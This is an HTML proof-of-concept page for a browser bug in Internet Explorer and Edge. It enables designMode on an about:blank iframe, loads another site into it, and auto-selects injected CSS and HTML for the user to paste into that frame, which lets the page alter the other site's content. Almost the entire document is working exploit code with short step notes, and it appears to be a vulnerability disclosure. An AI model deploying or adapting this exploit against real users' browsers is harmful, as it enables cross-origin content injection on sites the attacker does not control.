<!DOCTYPE html>
<body class="xyz">
<h1>IE/Edge - set designMode on any site</h1>
<p>Works on all IE versions + Edge</p> 
<ol>
<li>Enable document.designMode on about:blank iframe</li>
<li>Load another site in frame</li>
<li>Copy+paste HTML into frame (UXSS was fixed in CVE-2010-0494)</li>
</ol>
<p id="sel">[copy+

body:not(.xyz) h1 { color: red; background-image: url('https://encrypted-tbn2.gstatic.com/images?q=tbn:ANd9GcSY3rM6CeFOHbar2dKEiEvOoXDlkuwObLDSqdvm3XPXR2DYbtc_vA&foo=bardsfdfg'); background-color:green }
</style>
paste me into the iframe]</p>

<iframe id="f"></iframe>

<script>
function doSel() {
    var r = document.createRange();
	r.selectNodeContents(document.getElementById('sel'));
    var selection = window.getSelection();
    selection.removeAllRanges();
    selection.addRange(r);
}

function doDesignMode() { 
	var frame = document.getElementById('f');
	frame.src = 'about:blank';
	frame.onload = function() {
		frame.contentWindow.document.designMode = 'on';
		frame.src = 'https://example.org';
		frame.onload = null;
	};
}
doDesignMode();
doSel();
document.getElementById('sel').onclick=doSel;
</script>

</body>
